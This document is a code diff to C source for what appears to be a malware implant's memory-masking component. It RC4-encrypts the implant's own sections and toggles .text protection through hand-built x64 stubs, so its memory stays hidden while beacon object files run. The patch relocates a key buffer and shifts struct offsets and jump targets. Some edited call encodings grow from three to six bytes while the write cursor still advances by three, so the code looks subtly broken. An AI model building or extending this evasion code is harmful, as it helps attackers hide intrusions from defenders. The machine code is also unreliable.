@@ -86,11 +86,16 @@ typedef struct {
 	BW_USTRING      u_key;                /* +0x60  (Buffer -> ctx->key)      */
 	unsigned long   vp_old;               /* +0x70 VirtualProtect old-prov bin */
 	unsigned long   text_prot;            /* +0x74 .text original protection  */
-	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x78 */
-	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x80 */
-	volatile LONG   phase;                /* +0x88 crash forensics: 1=VP done
-	                                       * 2=masked 3=BOF done 4=.text back */
-	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0x90 */
+	unsigned char   key2[16];             /* +0x78 ctr-variant work buffer: bw_rc4
+	                                       * must not carry a stack array, or /GS
+	                                       * reads the ciphertext cookie on the
+	                                       * .data-unmask call and fail-fasts in
+	                                       * the epilogue (bypasses every VEH) */
+	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x88 */
+	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x90 */
+	volatile LONG   phase;                /* +0x98 crash forensics: 1=VP done
+	                                       * 2=masked 3=BOF done 4=exit back  */
+	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0xA0 */
 } BW_CTX;
 
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
@@ -109,24 +114,28 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
+/* GS-free by construction: the ctr-variant key bytes land in the private
+ * ctx page (work), never in a stack array. A stack array gives this frame
+ * a /GS cookie - and the .data-unmask call would read the ciphertext cookie
+ * in its prologue and the restored one in its epilogue (mismatch = fail-fast
+ * that bypasses every VEH, the host-test killer). */
 static void bw_rc4(BW_SF032 fn, unsigned char * buf, unsigned long len,
-                   const unsigned char * key, unsigned int ctr)
+                   unsigned char * work, const unsigned char * key, unsigned int ctr)
 {
-	unsigned char k[16];
 	BW_USTRING d, kk;
 	int j;
 
 	for (j = 0; j < 16; j++)
-		k[j] = key[j];
-	k[0] ^= (unsigned char)ctr;
-	k[1] ^= (unsigned char)(ctr >> 8);
-	kk.Buffer = k;
+		work[j] = key[j];
+	work[0] ^= (unsigned char)ctr;
+	work[1] ^= (unsigned char)(ctr >> 8);
+	kk.Buffer = work;
 	kk.Length = kk.MaximumLength = 16;
 	d.Buffer = buf;
 	d.Length = d.MaximumLength = len;
 	fn(&d, &kk);
-	for (j = 0; j < 16; j++)
-		k[j] = 0;
+	work[0] = 0;
+	work[1] = 0;
 }
 
 /* section protection with guard/noaccess rejection. The original
@@ -387,7 +396,7 @@ static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
 		if (i == ctx->text_idx)
 			continue;
 		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
-		       ctx->key, (unsigned int)i);
+		       ctx->key2, ctx->key, (unsigned int)i);
 	}
 	/* .text protection was restored by the winning stub; the remaining
 	 * blocks' protections are restored by the window teardown on the BOF
@@ -446,11 +455,11 @@ static BOOL bw_build_pages(void)
 	e += 6;
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RW */
+	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RW */
 	e += 3;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x89; e[1] = 0x40; e[2] = 0x88;                          /* mov [rax+0x88],eax: VP ret (eax, not ecx) */
+	e[0] = 0x89; e[1] = 0x40; e[2] = 0x98;                          /* mov [rax+0x98],eax: phase=VP ret */
 	e += 3;
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
@@ -481,7 +490,7 @@ static BOOL bw_build_pages(void)
 	e = p + BW_EXIT_OFF;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0xC7; e[1] = 0x40; e[2] = 0x88;                          /* mov dword [rax+0x88],3 */
+	e[0] = 0xC7; e[1] = 0x40; e[2] = 0x98;                          /* mov dword [rax+0x98],3 */
 	e[3] = 0x03; e[4] = 0x00; e[5] = 0x00; e[6] = 0x00;
 	e += 7;
 	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
@@ -490,7 +499,7 @@ static BOOL bw_build_pages(void)
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x4D;                                        /* jne ret (+0x4D) */
+	e[0] = 0x75; e[1] = 0x49;                                        /* jne ret (+0x49) */
 	e += 2;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
@@ -508,7 +517,7 @@ static BOOL bw_build_pages(void)
 	e = bw_put32(e + 3, 0x74);
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RX */
+	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RX */
 	e += 3;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
@@ -519,7 +528,7 @@ static BOOL bw_build_pages(void)
 	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
 	e = bw_put32(e + 3, 0x50);
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call [rax+0x80] flush */
-	e = bw_put32(e + 2, 0x80);
+	e = bw_put32(e + 2, 0x90);
 	e[0] = 0xC3;                                                     /* ret */
 	e += 1;
 	if ((int)(e - (p + BW_EXIT_OFF)) > 0x70)
@@ -539,7 +548,7 @@ static BOOL bw_build_pages(void)
 	e += 2;
 	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
 	e += 3;
-	e[0] = 0x75; e[1] = 0x66;                                        /* jne wd_ret (+0x66) */
+	e[0] = 0x75; e[1] = 0x6C;                                        /* jne wd_ret (+0x6C) */
 	e += 2;
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
 	e += 4;
@@ -559,7 +568,7 @@ static BOOL bw_build_pages(void)
 	e = bw_put32(e + 3, 0x74);
 	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
 	e += 4;
-	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x78;                          /* call VP->RX */
+	e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00;                          /* call VP->RX */
 	e += 3;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
@@ -570,7 +579,7 @@ static BOOL bw_build_pages(void)
 	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x50] len32 */
 	e = bw_put32(e + 3, 0x50);
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call flush */
-	e = bw_put32(e + 2, 0x80);
+	e = bw_put32(e + 2, 0x90);
 	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
@@ -697,7 +706,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	}
 	for (i = 0; i < nblocks; i++) {
 		if (i != text_idx)
-			bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+			bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
 	}
 	ctx->phase = 2; /* all but .text masked */
 
@@ -716,7 +725,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	if (InterlockedExchange(&ctx->rest_done, 1) == 0) {
 		for (i = 0; i < nblocks; i++) {
 			if (i != text_idx)
-				bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+				bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
 		}
 	}
 	bw_blocks_restore(blocks, nblocks, text_idx);
